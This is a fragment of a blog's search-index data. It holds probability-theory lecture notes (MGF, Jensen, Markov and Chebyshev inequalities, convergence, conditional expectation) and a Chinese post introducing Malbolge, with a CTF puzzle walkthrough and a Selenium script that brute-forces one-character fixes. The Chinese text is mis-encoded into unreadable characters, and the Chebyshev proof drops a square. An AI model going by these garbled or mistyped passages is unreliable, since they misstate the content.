\\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2\\sigma^2 \\left(t + \\frac{\\mu}{\\sigma^2}\\right)x \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2(\\mu + \\sigma^2 t)x \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2(\\mu + \\sigma^2 t)x + (\\mu + \\sigma^2 t)^2 - (\\mu + \\sigma^2 t)^2 \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ (x - \\mu - \\sigma^2 t)^2 - (\\mu + \\sigma^2 t)^2 \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\frac{(\\mu + \\sigma^2 t)^2 - \\mu^2}{2\\sigma^2} \\\\ &= -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\mu t + \\frac{1}{2} \\sigma^2 t^2 \\end{align*}Then we have \\begin{align*} M_X(t) &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\mu t + \\frac{1}{2} \\sigma^2 t^2 \\right)\\, dx \\\\ &=e^{\\mu t + \\frac{1}{2} \\sigma^2 t^2} \\cdot \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} \\right)\\, dx \\\\ &= e^{\\mu t + \\frac{\\sigma^2 t^2}{2}}. \\end{align*}p.s.: the calculation/proof of Gaussian integral \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} \\right)\\, dx = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-\\frac{y^2}{2}}\\, dy = 1can be found here: https://archer-baiyi.github.io/2025/06/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/Probability-Distributions/#Normal-Distribution .$\\square$ Important InequalitiesTheorem (Jensen&#39;s Inequality):Let $\\varphi:\\mathbb{R} \\to \\mathbb{R}$ be convex. If $\\mathbb{E}[|X|] &lt; \\infty$, then $\\mathbb{E}[\\varphi(X)]$ is well-defined and one has \\varphi(\\mathbb{E}[X]) \\leq \\mathbb{E}[\\varphi(X)]. Corollary:1. |\\mathbb{E}[X]| \\leq \\mathbb{E}[|X|]2. for $p \\geq 1 :$|\\mathbb{E}[X]|^p \\leq \\mathbb{E}[|X|^p]3. for $1 \\leq p &lt; q :$(\\mathbb{E}[|X|^p])^{\\frac{1}{p}} \\leq (\\mathbb{E}[|X|^q])^{\\frac{1}{q}} proof: 1. take $\\varphi(x) = |x|$. 2. take $\\varphi(x) = |x|^p, p \\geq 1$. 3. Let $1 \\leq p &lt; q , \\alpha := q/p &gt; 1, Z := |X|^p$. From 2 we have \\begin{align*} &\\quad |\\mathbb{E}[Z]|^\\alpha \\leq \\mathbb{E}[|Z|^\\alpha] \\\\ \\Longleftrightarrow &\\quad |\\mathbb{E}[|X|^p]|^\\alpha \\leq \\mathbb{E}[|X|^{\\alpha p}] \\\\ \\Longleftrightarrow &\\quad |\\mathbb{E}[|X|^p]|^{\\frac{1}{p}} \\leq \\mathbb{E}[|X|^{\\alpha p}]^{\\frac{1}{\\alpha p}} \\\\ \\Longleftrightarrow &\\quad (\\mathbb{E}[|X|^p])^{\\frac{1}{p}} \\leq (\\mathbb{E}[|X|^q])^{\\frac{1}{q}} \\end{align*}$\\square$ Theorem (Markov&#39;s inequality):Let $X$ be a real-valued random variable and let $f : [0, \\infty) \\to [0, \\infty)$ be a monotonically increasing function with $f(x) &gt; 0$ for all $x &gt; 0$.Then for all $a &gt; 0$ we have:P(|X| \\geq a) \\leq \\frac{\\mathbb{E}[f(|X|)]}{f(a)}.In particular, for all $a, p &gt; 0$, it holds:P(|X| \\geq a) \\leq \\frac{\\mathbb{E}[|X|^p]}{a^p}. Proof: Since $f \\geq 0$ and is monotonically increasing, we have : f(|X|) \\geq f(|X|)\\mathbf{1}_{\\{|X| \\geq a\\}} \\geq f(a)\\mathbf{1}_{\\{|X| \\geq a\\}}.From the monotonicity of the expectation, it follows that: \\mathbb{E}[f(|X|)] \\geq \\mathbb{E}[f(a)\\mathbf{1}_{\\{|X| \\geq a\\}}] = f(a)P(|X| \\geq a).Since $f(a) &gt; 0$, the claim follows. $\\square$ Theorem (Chebyshev&#39;s inequality):Let $X \\in \\mathcal{L}^2$ (i.e.$\\mathbb{E}[|X|^2] &lt; \\infty$) be a real-valued random variable, then for all $a &gt; 0$ we have:P(|X-\\mathbb{E}[X]| \\geq a) \\leq \\frac{\\text{Var}(X)}{a^2}. Proof: Let $Y = X-\\mathbb{E}[X]$, $f(x):=x^2$. By applying Markovâ€™s inequality we have: P(|X-\\mathbb{E}[X]| \\geq a) \\leq \\frac{ \\mathbb{E}[|X-\\mathbb{E}[X]]}{a^2}\\leq \\frac{\\text{Var}(X)}{a^2}.$\\square$ ConvergenceDefinition: For $p \\geq 1$ we say $Y \\in L^p$ if $E[|Y|^p] &lt; \\infty$. Definition: Let $X,X_i,i \\geq 1$ be random variables on the same probability space $(\\Omega,\\mathcal{F},P)$.1. $X_n \\rightarrow X$ almost surely (a.s.) ifP(\\{\\omega | \\lim_{n \\to \\infty} X_n(\\omega) = X(\\omega)\\}) = 1.We write $X_n \\xrightarrow{P-a.s.} X$.2. $X_n \\rightarrow X$ in probability if \\forall \\varepsilon > 0 : \\lim_{n \\to \\infty} P(|X_n - X| > \\varepsilon) = 0.We write $X_n \\xrightarrow{P} X$ or $X_n \\xrightarrow{\\text{in probability}} X$.3. $X_n \\to X$ in $L^p$ for $p \\geq 1$ if $X_n \\in L^p$ for all $n$, $X \\in L^p$, and\\lim_{n \\to \\infty} E[|X_n - X|^p] = 0.We write $X_n \\xrightarrow{L^p} X$. Definition: Let $\\mu_n, \\mu$ be probability measures on $(\\mathbb{R}, \\mathcal{B}(\\mathbb{R}))$, we say that $\\mu_n$ converges weakly to $\\mu$ ($\\mu_n \\Rightarrow \\mu$ or $\\mu_n \\xrightarrow{w} \\mu$) if\\int f \\, d\\mu_n \\longrightarrow \\int f \\, d\\mu \\quad \\forall f : \\mathbb{R} \\to \\mathbb{R} \\text{ bounded and continuous.} \\tag{3.4}We say $X_n \\xrightarrow{w} X$ if $\\mathcal{L}(X_n) \\xrightarrow{w} \\mathcal{L}(X)$, where $\\mathcal{L}(X_n)$ denotes the distribution of $X_n$. Remark: X_n \\xrightarrow{w} X \\quad \\Longleftrightarrow \\quad E[f(X_n)] \\underset{n \\to \\infty}{\\longrightarrow} E[f(X)] \\quad \\forall f : \\mathbb{R} \\to \\mathbb{R} \\text{ bounded and continuous.} Proof: $E[f(Y)] = \\int f(y) \\, \\mu(dy) \\quad \\text{with } \\mu = \\mathcal{L}(Y).$$\\square$ Theorem:(a) If $p_1 &lt; p_2$, then $X_n \\to X$ in $L^{p_2}$ implies $X_n \\to X$ in $L^{p_1}$.(b) $X_n \\to X$ in $L^p$ or almost surely implies $X_n \\to X$ in probability.(c) Suppose there exists $Y \\in L^p$ such that $|X_n| \\leq Y$ for all $n$. If $X_n \\to X$ in probability and $X \\in L^p$, then $X_n \\to X$ in $L^p$. proof: $\\square$ Corollary: If $X_n \\to Xâ€™$ in $L^p$ and $X_n \\to Xâ€™â€™$ almost surely, then $Xâ€™ = Xâ€™â€™$ a.e. (i.e. $P(Xâ€™ = Xâ€™â€™) = 1$). proof: It follows from the Theorem that $X_n \\to X$ and $X_n \\to Xâ€™â€™$ in probability, since the limit is unique, one has $Xâ€™ = Xâ€™â€™$ a.e.$\\square$ Conditional ExpectationDefinitionsDefinition: Let $(\\Omega, \\mathcal{F}_0, P)$ be a probability space. Let $X : \\Omega \\to [-\\infty, +\\infty]$ be an $(\\mathcal{F}_0, \\mathcal{B}([-\\infty,+\\infty]))$-measurable random variable with $\\mathbb{E}[|X|] &lt; \\infty$ or $X \\geq 0$, and let $\\mathcal{F} \\subseteq \\mathcal{F}_0$ be a $\\sigma$-algebra.The conditional expectation $\\mathbb{E}[X \\mid \\mathcal{F}]$ of $X$ given $\\mathcal{F}$ is a random variable $Y : \\Omega \\to [-\\infty, +\\infty]$ with the following properties:(C1) $Y$ is $(\\mathcal{F}, \\mathcal{B}([-\\infty,+\\infty]))$-measurable.(C2)\\int_A X \\, dP = \\int_A Y \\, dP \\quad \\forall A \\in \\mathcal{F}If $\\mathbb{E}[|X|] &lt; \\infty$, then $\\mathbb{E}[X \\mid \\mathcal{F}]$ is almost surely finite. Every random variable fulfilling (C1) and (C2) is called a version of $\\mathbb{E}[X \\mid \\mathcal{F}]$. Definition:\\mathbb{E}[X \\mid Y]:= \\mathbb{E}[X \\mid \\sigma(Y)] Theorem:The conditional expectation exists and is almost surely unique. ProportiesTheorem:1. $X$ $\\mathcal{F}$-measurable $\\Longrightarrow$ $\\mathbb{E}[X\\mid \\mathcal{F}] = X$ almost surely.2. $\\sigma(X)$ and $\\mathcal{F}$ are independent $\\Longrightarrow$ $\\mathbb{E}[X \\mid \\mathcal{F}] = \\mathbb{E}[X]$ almost surely. Theorem:1. Linearity: For $a \\in \\mathbb{R}$,\\mathbb{E}[aX + Y \\mid \\mathcal{F}] = a \\mathbb{E}[X \\mid \\mathcal{F}] + \\mathbb{E}[Y \\mid \\mathcal{F}] \\quad \\text{almost surely.}2. Monotonicity: $X \\leq Y \\quad \\Longrightarrow \\quad \\mathbb{E}[X \\mid \\mathcal{F}] \\leq \\mathbb{E}[Y \\mid \\mathcal{F}]$ almost surely.3. Monotone convergence: $X_n \\geq 0$, $X_n \\uparrow X \\quad \\Longrightarrow \\quad \\mathbb{E}[X_n \\mid \\mathcal{F}] \\uparrow \\mathbb{E}[X \\mid \\mathcal{F}]$ almost surely. Theorem: \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}] = \\mathbb{E}[X] Theorem:If $X$ is $\\mathcal{F}$-measurable, $\\mathbb{E}[|XY|] &lt; \\infty$ and $\\mathbb{E}[|Y|] &lt; \\infty$, then\\mathbb{E}[XY \\mid \\mathcal{F}] = X \\mathbb{E}[Y \\mid \\mathcal{F}] \\quad \\text{almost surely}.This holds also if $X \\geq 0$ and $Y \\geq 0$. Theorem (â€œThe smaller $\\sigma$-algebra winsâ€) : Let $\\mathcal{F}_1, \\mathcal{F}_2$ be $\\sigma$-algebras satisfying $\\mathcal{F}_1 \\subseteq \\mathcal{F}_2$,$X$ be random variable. Then \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}_1] \\mid \\mathcal{F}_2] = \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}_2] \\mid \\mathcal{F}_1]= \\mathbb{E}[X \\mid \\mathcal{F}_1]almost surely.","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"æ¦‚ç‡è®º Probability Theory","slug":"TUM-æ•°å­¦-ç¬”è®°/æ¦‚ç‡è®º-Probability-Theory","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/"}],"tags":[{"name":"æ¦‚ç‡è®º","slug":"æ¦‚ç‡è®º","permalink":"https://archer-baiyi.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/tags/Probability-Theory/"}]},{"title":"å¥‡å¥‡æ€ªæ€ªçš„ç¼–ç¨‹è¯­è¨€ï¼šMalbolge","slug":"CTF/Misc/å¥‡å¥‡æ€ªæ€ªçš„ç¼–ç¨‹è¯­è¨€ï¼šMalbolge","date":"2025-04-25T20:30:56.000Z","updated":"2025-04-25T20:42:18.467Z","comments":true,"path":"2025/04/25/CTF/Misc/å¥‡å¥‡æ€ªæ€ªçš„ç¼–ç¨‹è¯­è¨€ï¼šMalbolge/","permalink":"https://archer-baiyi.github.io/2025/04/25/CTF/Misc/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%EF%BC%9AMalbolge/","excerpt":"ç®€å•ä»‹ç» Malbolge","text":"é™¤äº†æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„Pythonã€Javaã€Cç­‰ä¸»æµç¼–ç¨‹è¯­è¨€å¤–ï¼Œè¿˜å­˜åœ¨è¿™ä¹ˆä¸€ç±»æä¸ºæ™¦æ¶©éš¾æ‡‚çš„ç¼–ç¨‹è¯­è¨€ï¼Œè¢«ç§°ä¸ºæ·±å¥¥çš„ç¼–ç¨‹è¯­è¨€ï¼ˆEsoteric programming languageï¼Œç®€ç§°Esolangï¼‰ã€‚å®ƒä»¬è¢«è®¾è®¡ç”¨äºæµ‹è¯•è®¡ç®—æœºè¯­è¨€è¡¨è¾¾çš„æé™ï¼Œæ‰€ä»¥ä¸ä¼šè€ƒè™‘å®ƒä»¬çš„å®ç”¨æ€§ã€‚ä»Šå¤©æˆ‘ä»¬æ¥çœ‹å…¶ä¸­ä¸€ä¸ªéå¸¸å…¸å‹çš„ä¾‹å­ï¼šMalbolgeã€‚ Malbolgeç”±Ben Olmstead åœ¨1998å¹´å‘æ˜,å…¶åå­—æ¥è‡ªäºä½†ä¸çš„ã€Šç¥æ›²ã€‹ä¸­çš„ç¬¬å…«å±‚åœ°ç‹±â€œMalebolgeâ€ï¼Œæ„å¤§åˆ©è¯­ä¸­æ„ä¸ºâ€œé‚ªæ¶çš„æ²Ÿæ¸ â€ï¼ˆmale bolgeï¼‰ã€‚ Hello Worldä¸‹é¢è¿™æ®µMalbolgeä»£ç ä¼šè¾“å‡ºâ€œHello, World.â€1(=&lt;`#9]~6ZY327Uv4-QsqpMn&amp;+Ij&quot;&#x27;E%e&#123;Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV&gt;gY;dts76qKJImZkjè€Œè¿™æ®µä»£ç åˆ™ä¼šè¾“å‡ºâ€œHello, World!â€1(&#x27;&amp;%:9]!~&#125;|z2Vxwv-,POqponl$Hjihf|B@@&gt;,=&lt;M:9&amp;7Y#VV2TSn.Oe*c;(I&amp;%$#&quot;mCBA?zxxv*Pb8`qo42mZF.&#123;Iy*@dD&#x27;&lt;;_?!\\&#125;&#125;|z2VxSSQæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…‰æ˜¯ä¸€ä¸ªæ ‡ç‚¹ç¬¦å·çš„æ”¹å˜ï¼Œå°±å¯¼è‡´ä»£ç å‘ç”Ÿäº†å¤©ç¿»åœ°è¦†çš„å˜åŒ–ã€‚ CTFå¤§å¤šæ•°æ¶‰åŠ Malbolge çš„åŸºç¡€ CTF é¢˜ç›®ä¼šæä¾›ä¸€æ®µçœ‹ä¼¼ä¹±ç çš„å†…å®¹ã€‚æ­¤æ—¶ï¼Œéœ€è¦è¯†åˆ«å‡ºè¿™å®é™…ä¸Šæ˜¯ Malbolge ä»£ç ï¼Œå¹¶é€šè¿‡ç¼–è¯‘å™¨å°†å…¶ç¼–è¯‘å‡ºæ¥ã€‚ æ¯”å¦‚è¯´è¿™æ®µä»£ç ä¼šè¾“å‡ºâ€œflag{this_is_a_flag}â€1D&#x27;`;qLo=I;|XyhCwStcr=NL-,I$)&quot;XW21A/c&gt;,v_)\\xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;QuUTSRQJImGLEJIBAeED&amp;B;_9&gt;7&lt;;:921U54ts10)M&#x27;&amp;Jkj&quot;F&amp;%|#z@~&#125;vu;y[Zvo5Vlkjongf,Miha&#x27;Hd]\\[ZY&#125;W?UZYRQuU7SLp] æœ‰äº›é¢˜ç›®å¯èƒ½éœ€è¦å¯¹ç¼–è¯‘åçš„ç»“æœå†è¿›è¡Œä¸€æ¬¡å¤„ç†ï¼Œæ¯”å¦‚ä½¿ç”¨ base64 è§£ç ç­‰ã€‚ä½†æ˜¯è¿™äº›å†…å®¹éƒ½ä¸éœ€è¦äº†è§£ä»»ä½• Malbolge è¯­è¨€çš„ç‰¹æ€§ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¼–è¯‘å™¨å³å¯ã€‚å› æ­¤ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šä»‹ç»ä¸€äº› Malbolge çš„ç‰¹ç‚¹ï¼Œå¹¶åˆ†äº«ä¸€é“è¾ƒéš¾çš„ CTF æ¯”èµ›çœŸé¢˜ã€‚ Malbolgeçš„ç‰¹ç‚¹é¦–å…ˆï¼ŒMalbolgeä¼šä½¿ç”¨ ä¸‰ä¸ªå¯„å­˜å™¨ï¼ˆregisterï¼‰ï¼Œåˆ†åˆ«æ˜¯ aã€c å’Œ dã€‚aï¼šAccumulatorï¼Œä¸»è¦ç”¨äºå­˜å‚¨è®¡ç®—ç»“æœå’Œè¾“å…¥/è¾“å‡ºæ•°æ®ã€‚cï¼šCode Pointer / Instruction Pointerï¼Œç”¨äºæŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä»£ç çš„ä½ç½®ï¼ˆå³æŒ‡ä»¤æŒ‡é’ˆï¼‰ã€‚dï¼šData Pointerï¼Œç”¨äºæŒ‡å‘å†…å­˜ä¸­çš„æ•°æ®ä½ç½®ã€‚ å…¶æ¬¡ï¼ŒåŸºäºè¿™äº›å¯„å­˜å™¨ï¼ŒMalbolgeæä¾›äº†å…«æ¡æŒ‡ä»¤ï¼Œåˆ†åˆ«ä¸ºï¼šjmpï¼Œoutï¼Œinï¼Œrotrï¼Œmovï¼Œcrzï¼Œnopï¼Œendã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŸäº›åœ¨çº¿ç¼–è¯‘ç½‘ç«™æä¾›çš„è§„èŒƒåŒ–ï¼ˆNormalizationï¼‰åŠŸèƒ½ï¼Œå°†ä»£ç è½¬æ¢ä¸ºç”±ä¸€ç»„å›ºå®šå­—ç¬¦ç»„æˆçš„æŒ‡ä»¤å­—ç¬¦é›†ï¼Œä»è€Œæ›´æ–¹ä¾¿åœ°è¿›è¡Œè°ƒè¯•ï¼ˆdebugï¼‰ã€‚ æ›´å¤šè¯¦ç»†ä¿¡æ¯å¯ä»¥å‚è€ƒhttps://en.wikipedia.org/wiki/Malbolge ä¾‹é¢˜é¢˜ç›®æ¥æºï¼šPlatypwn 2024 CTFé“¾æ¥ï¼šhttps://platypwn.ctf.platypwnies.de/é¢˜é¢ï¼š ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å†…å®¹ä¸ºï¼š1D&#x27;`__LK!mY:jiy6Be3cPa)onKI[#j4&amp;DUBzcx&gt;_;):&#x27;Zputml21onPlkd*hJIedcb[!YXW&#123;[TYXWVUNrRQPImGFEDIBfFED=&lt;;:?8\\&lt;;432V65ut,P*/(&#x27;&amp;J*j(!~&#125;C#cy~&#125;v&lt;tsxwvon4Ukji/Plejc)gIedcb[!_^]\\U=SwWVONMqQPONMFjJIHGF(&gt;b&lt;$:?876ZGè¿™æ®µå†…å®¹çœ‹ä¼¼æ˜¯ä¹±ç ï¼Œä½†æ ¹æ®é¢˜é¢çš„æç¤ºâ€œthe worst of esoteric programming languagesâ€ ï¼ˆæ­£å¦‚å‰æ–‡æ‰€æåˆ°çš„ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºå®ƒå®é™…ä¸Šæ˜¯ä¸€æ®µMalbolgeçš„ä»£ç ã€‚ç›´æ¥ç¼–è¯‘è¿™æ®µä»£ç æ— æ³•å¾—åˆ°ä»»ä½•ç»“æœï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨æŸä¸ªåœ¨çº¿ç¼–è¯‘å·¥å…·å¯¹å…¶è¿›è¡Œè§„èŒƒåŒ–å¤„ç†ï¼Œä½¿ä»£ç è½¬æ¢ä¸ºæ›´æ ‡å‡†çš„æŒ‡ä»¤å­—ç¬¦é›†ï¼Œä»è€Œä¾¿äºè°ƒè¯•ï¼ˆdebugï¼‰ï¼š normalized ä¹‹åçš„ç»“æœä¸ºï¼š 1ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;v*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v å½“æˆ‘ä»¬è¿è¡Œè¿™æ®µä»£ç æ—¶ï¼Œä¼šå‘ç°å®ƒåœ¨æ‰§è¡Œåˆ°ä¸­é—´æŸå¤„æ—¶æ„å¤–åœæ­¢äº†ï¼š å¤§æ¦‚æ˜¯åœ¨è¿™ä¸ªä½ç½®ï¼š æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹ï¼ˆå°è¯•ï¼‰éœ€è¦å°†è¿™ä¸€é¡¹æ”¹æˆå…¶ä»–çš„å‘½ä»¤ã€‚è€Œåœ¨å°†å…¶æ”¹æ­£ä¸ºpäº†ä¹‹åä¼šå¾—åˆ°ï¼š è®¢æ­£åçš„å†…å®¹ 1ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;p*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v 1D&#x27;`__LK!mY:jiy6Be3cPa)onKI[#j4&amp;DUBzcx&gt;_;):&#x27;Zputml21onPlkd*hJIedcb[!YXW&#123;[TYXWVUNrRQPImGFEDIBfFED=&lt;;:?8\\&lt;;432V65ut,P*/(&#x27;&amp;J*j(!~&#125;C#cy~&#125;v&lt;tsxwvon4Ukji/Plejc)gIedcb[!_^]\\U=SwWVONMqQPONMFjJIHGF(&gt;b&lt;$:?876ZG å…·ä½“æ”¹åŠ¨ï¼š è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±æˆåŠŸè·å–åˆ°äº†flagã€‚ å…¶ä»–åŠæ³•æš´åŠ›ç ´è§£å½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“ï¼ˆæˆ–çŒœæµ‹ï¼‰è¿™æ®µä»£ç ä¸­åªæœ‰ä¸€ä¸ªåœ°æ–¹å­˜åœ¨é—®é¢˜ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£ï¼ˆbrute forceï¼‰çš„æ–¹æ³•è¿›è¡Œä¿®æ­£ã€‚è¿™ç§æ–¹æ³•çš„æ ¸å¿ƒæ˜¯å°†æ¯æ¡æŒ‡ä»¤é€ä¸€ä¿®æ”¹ä¸ºå…¶ä»–å¯èƒ½çš„æŒ‡ä»¤ï¼Œå¹¶è§‚å¯Ÿç¼–è¯‘ç»“æœã€‚ç”±äºä¸éœ€è¦ç†è§£ Malbolge çš„å…·ä½“ç‰¹æ€§ï¼Œå› æ­¤è¿™ç§æ–¹æ³•éå¸¸ç®€å•ã€‚ ä¸ºå®ç°è¿™ä¸€ç›®æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ”¯æŒåœ¨çº¿ç¼–è¯‘ Malbolge çš„ç½‘ç«™ï¼Œä»¥åŠ Python ä¸­çš„ Selenium åº“ã€‚Selenium æä¾›äº†æµè§ˆå™¨è‡ªåŠ¨åŒ–æ“ä½œåŠŸèƒ½ï¼Œèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬å®Œæˆç½‘é¡µä¸Šçš„å‹¾é€‰ã€è¾“å…¥æ“ä½œï¼Œå¹¶æå–è¾“å‡ºå†…å®¹ï¼Œä»è€Œå®ç°è‡ªåŠ¨åŒ–è°ƒè¯•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport time# åˆå§‹åŒ–æµè§ˆå™¨ï¼ˆç¡®ä¿ä½ æœ‰å¯¹åº”çš„æµè§ˆå™¨é©±åŠ¨ï¼‰# driver = webdriver.Chrome() # Chromedriver = webdriver.Firefox() # Firefoxtry: # æ‰“å¼€ç›®æ ‡ç½‘é¡µ driver.get(&quot;https://lutter.cc/malbolge/debugger.html&quot;) # ç­‰å¾…é¡µé¢åŠ è½½ wait = WebDriverWait(driver, 30) # å‹¾é€‰æ‰€æœ‰å¤é€‰æ¡† checkboxes_ids = [&#x27;until_in&#x27;, &#x27;until_out&#x27;, &#x27;until_crz&#x27;, &#x27;until_rotr&#x27;, &#x27;until_jmp&#x27;, &#x27;until_mov&#x27;, &#x27;until_nop&#x27;] for checkbox_id in checkboxes_ids: checkbox = wait.until(EC.element_to_be_clickable((By.ID, checkbox_id))) if not checkbox.is_selected(): checkbox.click() # å‹¾é€‰Normalized normalized_checkbox = wait.until(EC.element_to_be_clickable((By.ID, &#x27;normalizedcode&#x27;))) if not normalized_checkbox.is_selected(): normalized_checkbox.click() # åŸå§‹Malbolgeä»£ç  original_code = &quot;ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;v*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v&quot; # æ›¿æ¢çš„å­—ç¬¦åˆ—è¡¨ replace_chars = [&#x27;i&#x27;, &#x27;j&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;/&#x27;, &#x27;*&#x27;] # æ ‡å¿—å˜é‡ï¼Œç”¨äºé€€å‡ºå¾ªç¯ found_flag = False # å¾ªç¯æ›¿æ¢å¹¶æ‰§è¡Œä»£ç  for i in range(1, len(original_code)): if found_flag: # å¦‚æœæ‰¾åˆ°ç»“æœï¼Œé€€å‡ºå¤–å±‚å¾ªç¯ break for char in replace_chars: modified_code = list(original_code) modified_code[i] = char # æ›¿æ¢ç¬¬iä¸ªå­—ç¬¦ modified_code = &#x27;&#x27;.join(modified_code) # è¾“å…¥ä¿®æ”¹åçš„Malbolgeä»£ç  program_textarea = driver.find_element(By.ID, &quot;program&quot;) program_textarea.clear() program_textarea.send_keys(modified_code) # ç‚¹å‡»Load/ResetæŒ‰é’® load_button = driver.find_element(By.ID, &quot;load&quot;) load_button.click() # ç‚¹å‡»ExecuteæŒ‰é’® execute_button = wait.until(EC.element_to_be_clickable((By.ID, &quot;run&quot;))) execute_button.click() # ç­‰å¾…æ‰§è¡Œå®Œæˆå¹¶è·å–Outputå†…å®¹ time.sleep(1) # æ ¹æ®éœ€è¦è°ƒæ•´ç­‰å¾…æ—¶é—´ output_div = driver.find_element(By.ID, &quot;output&quot;) output_content = output_div.text # ä»…å½“outputå†…å®¹åŒ…å«&quot;flag&quot;æ—¶æ‰“å°ç»“æœ if &quot;pp&#123;&quot; in output_content.lower(): print(f&quot;å°†ç¬¬ &#123;i + 1&#125; ä½ä¿®æ”¹æˆ &#x27;&#123;char&#125;&#x27; åæˆåŠŸç¼–è¯‘å‡ºflagã€‚&quot;) print(f&quot;ç¼–è¯‘æˆåŠŸçš„ä»£ç : &#123;modified_code&#125;&quot;) found_flag = True # è®¾ç½®æ ‡å¿—å˜é‡ï¼Œæ ‡è®°å·²æ‰¾åˆ°ç»“æœ break # é€€å‡ºå†…å±‚å¾ªç¯finally: # å…³é—­æµè§ˆå™¨ driver.quit()# è¿è¡ŒæˆåŠŸåä¼šå¾—åˆ°ï¼š&quot;&quot;&quot;å°†ç¬¬ 43 ä½ä¿®æ”¹æˆ &#x27;p&#x27; åæˆåŠŸç¼–è¯‘å‡ºflagã€‚ç¼–è¯‘æˆåŠŸçš„ä»£ç : ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;p*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v&quot;&quot;&quot; ä¿®æ”¹è§£é‡Šå™¨æºä»£ç 